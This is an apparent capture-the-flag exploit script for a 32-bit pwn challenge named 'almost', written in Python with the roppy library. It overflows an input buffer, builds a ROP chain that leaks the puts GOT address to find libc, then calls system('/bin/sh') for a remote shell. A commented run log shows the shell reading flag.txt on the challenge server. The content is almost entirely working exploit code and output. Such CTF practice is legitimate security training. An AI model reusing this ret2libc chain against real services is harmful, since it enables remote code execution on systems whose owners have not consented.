from roppy import *

p = remote("jh2i.com", 50017)

elf = ELF("almost")
libc = ELF("libc6-i386_2.27-3ubuntu1.2_amd64.so")

def protocol():
    p.sendlineafter(":\n", "A"*100)

def domain():
    p.sendlineafter(":\n", "B"*100)

def path(payload):
    payload = payload.ljust(63, b"c")
    p.sendlineafter(":\n", payload)


protocol()
domain()

payload = b"A"*10
payload += p32(elf.plt("puts"))
payload += p32(elf.function("main"))
payload += p32(elf.got("puts"))

path(payload)

p.recvline()
p.recvline()
leak = u32(p.recv(4))
log.info("puts@GOT:   0x%x" %(leak))
libc.address = leak - libc.function("puts")

protocol()
domain()

payload = b"A"*10
payload += p32(libc.function("system"))
payload += p32(0xdeadbeef)

payload += p32(libc.search(b"/bin/sh\x00"))

path(payload)

'''
0 [07:43:53] vagrant@oracle(oracle) pwn> python3 almost.py 
[+] Opening connection to jh2i.com on port 50017: Done
[*] Analyzing /home/vagrant/CTFs/hacktivity/pwn/almost
[*] Analyzing /home/vagrant/CTFs/hacktivity/pwn/libc6-i386_2.27-3ubuntu1.2_amd64.so
[*] puts@GOT:   0xf7d8b3d0
[*] Switching to interactive mode
Result:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAA\x80��ﾭޏ���ccccccccccccccccccccccccccccccccccccccccc://BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAA\x80��ﾭޏ���ccccccccccccccccccccccccccccccccccccccccc/ls
almost    almost.c  flag.txt
$ cat flag.txt
flag{my_code_was_almost_secure}$ 
$ 
[*] Interrupted
[*] Closed connection to jh2i.com port 50017
'''


p.interactive()
